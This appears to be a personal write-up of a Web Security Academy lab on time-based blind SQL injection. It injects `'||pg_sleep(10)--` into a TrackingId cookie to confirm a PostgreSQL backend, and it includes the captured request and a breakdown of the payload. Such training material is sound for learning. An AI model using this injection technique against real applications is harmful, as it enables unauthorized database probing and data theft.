# Blind SQL injection with time delays

**Tags:** `Blind SQL injection` · `PostgreSQL` · `time-based` · `pg_sleep` · `tracking cookie`

## Objective

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

## 1. Identifying the injection point

Browsed the site normally and noticed the application sets a `TrackingId` cookie, which is sent back on every subsequent request:

```
Cookie: TrackingId=pCzpFbRMJ1lTKyx8; session=9YyGwbvQ051SYJQHL3f91JqMJpQFw7BT
```

Since the cookie value is reflected nowhere in the response and the page behaves identically regardless of its content, the application gives **no visible feedback** — a classic blind injection scenario. The query results aren't returned and there's no error-based oracle, so detection has to rely on a side channel: in this case, time.

## 2. Capturing the request

Captured a request to the filter endpoint in Burp Suite and sent it to Repeater:

```
GET /filter?category=Gifts HTTP/2
Host: 0a0500b504a84283827f5123003a0028.web-security-academy.net
Cookie: TrackingId=pCzpFbRMJ1lTKyx8; session=9YyGwbvQ051SYJQHL3f91JqMJpQFw7BT
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0500b504a84283827f5123003a0028.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

## 3. Determining the backend database

Since there was no error oracle and no `version()` output to read, the database engine had to be inferred from time-delay syntax behavior. PostgreSQL's `pg_sleep()` function is unique to Postgres (as opposed to `SLEEP()` in MySQL or `WAITFOR DELAY` in MSSQL), so testing it directly both confirms the engine and achieves the delay in one step.

Modified the `TrackingId` cookie value to break out of the string context and chain in the sleep function using PostgreSQL string concatenation (`||`):

```sql
pCzpFbRMJ1lTKyx8'||pg_sleep(10)--
```

Resulting in:

```
Cookie: TrackingId=pCzpFbRMJ1lTKyx8'||pg_sleep(10)--; session=9YyGwbvQ051SYJQHL3f91JqMJpQFw7BT
```

**Payload breakdown:**

| Part | Purpose |
|---|---|
| `pCzpFbRMJ1lTKyx8'` | Closes the original quoted string literal in the backend query |
| `\|\|` | PostgreSQL string concatenation operator, used here to chain in a function call |
| `pg_sleep(10)` | Forces the database to pause execution for 10 seconds |
| `--` | Comments out the remainder of the original query to keep it syntactically valid |

## 4. Confirming the delay

Sent the modified request via Repeater. The response time jumped to **~10 seconds**, confirming:

- The `TrackingId` cookie is concatenated directly into a SQL query without sanitization.
- The backend is **PostgreSQL** (confirmed by `pg_sleep` executing successfully).
- The injection point allows arbitrary SQL execution despite returning no visible output — classic blind SQLi confirmed via time-based inference.

## 5. Solving the Lab

Replayed the same request (with the `pg_sleep(10)` payload in the `TrackingId` cookie) as a normal browser request rather than just in Repeater, triggering the artificial time delay server-side. The lab recognized the successful time-based blind injection and was marked as **solved**.